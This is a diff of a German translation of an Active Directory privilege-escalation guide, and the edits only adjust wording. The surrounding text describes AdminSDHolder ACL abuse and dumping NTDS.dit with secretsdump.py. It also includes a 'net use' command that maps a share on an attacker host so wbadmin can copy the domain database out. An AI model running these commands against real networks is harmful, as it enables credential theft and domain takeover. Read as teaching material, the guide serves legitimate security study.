@@ -16,13 +16,13 @@ Um die Mitglieder dieser Gruppe zu identifizieren, wird der folgende Befehl ausg
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung bei DC01.
+Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung an DC01.
 
 ## AdminSDHolder-Gruppe
 
 Die Access Control List (ACL) der **AdminSDHolder**-Gruppe ist entscheidend, da sie Berechtigungen für alle "geschützten Gruppen" innerhalb von Active Directory festlegt, einschließlich hochprivilegierter Gruppen. Dieser Mechanismus gewährleistet die Sicherheit dieser Gruppen, indem er unbefugte Änderungen verhindert.
 
-Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe ändert und einem Standardbenutzer vollständige Berechtigungen gewährt. Dies würde diesem Benutzer effektiv die vollständige Kontrolle über alle geschützten Gruppen geben. Wenn die Berechtigungen dieses Benutzers geändert oder entfernt werden, würden sie aufgrund des Systemdesigns innerhalb einer Stunde automatisch wiederhergestellt.
+Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe ändert und einem Standardbenutzer vollständige Berechtigungen gewährt. Dies würde diesem Benutzer effektiv die volle Kontrolle über alle geschützten Gruppen geben. Wenn die Berechtigungen dieses Benutzers geändert oder entfernt werden, würden sie aufgrund des Systemdesigns innerhalb einer Stunde automatisch wiederhergestellt.
 
 Befehle zur Überprüfung der Mitglieder und zur Änderung der Berechtigungen umfassen:
 ```powershell
@@ -117,7 +117,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### Verwendung von wbadmin.exe
 
-1. Richten Sie das NTFS-Dateisystem für den SMB-Server auf der Angreifermaschine ein und speichern Sie die SMB-Anmeldeinformationen auf der Zielmaschine.
+1. Richten Sie das NTFS-Dateisystem für den SMB-Server auf der Angreifermaschine ein und cachen Sie die SMB-Anmeldeinformationen auf der Zielmaschine.
 2. Verwenden Sie `wbadmin.exe` für die Systembackup- und `NTDS.dit`-Extraktion:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -182,7 +182,7 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 ```
 ## Exchange Windows-Berechtigungen
 
-Diese Gruppe kann DACLs auf dem Domänenobjekt ändern und möglicherweise DCSync-Berechtigungen gewähren. Techniken zur Privilegieneskalation, die diese Gruppe ausnutzen, sind im Exchange-AD-Privesc GitHub-Repo detailliert beschrieben.
+Diese Gruppe kann DACLs am Domänenobjekt ändern und möglicherweise DCSync-Berechtigungen gewähren. Techniken zur Privilegieneskalation, die diese Gruppe ausnutzen, sind im Exchange-AD-Privesc GitHub-Repo detailliert beschrieben.
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
